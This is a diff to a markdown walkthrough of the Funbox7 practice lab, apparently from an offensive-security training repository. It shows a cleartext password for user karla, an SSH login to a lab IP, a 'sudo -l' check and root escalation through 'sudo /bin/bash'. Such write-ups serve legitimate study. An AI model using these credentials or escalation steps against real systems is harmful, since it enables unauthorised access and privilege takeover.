@@ -293,3 +293,19 @@ su karla
 Password: tgbzhnujm!
 ```
 ![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/dad7c59c-68a3-4ba7-b4f1-563930f3bb31)
+
+SSH as Karla
+```
+ssh karla@192.168.245.132
+```
+```
+karla@funbox7:~$ sudo -l
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/99a5c72a-09b5-4429-a5b9-8ad26542f6b8)
+
+```
+karla@funbox7:~$ sudo /bin/bash
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/1a4f10a9-a7ec-4818-9b12-96ab7b1ce77d)
+
+
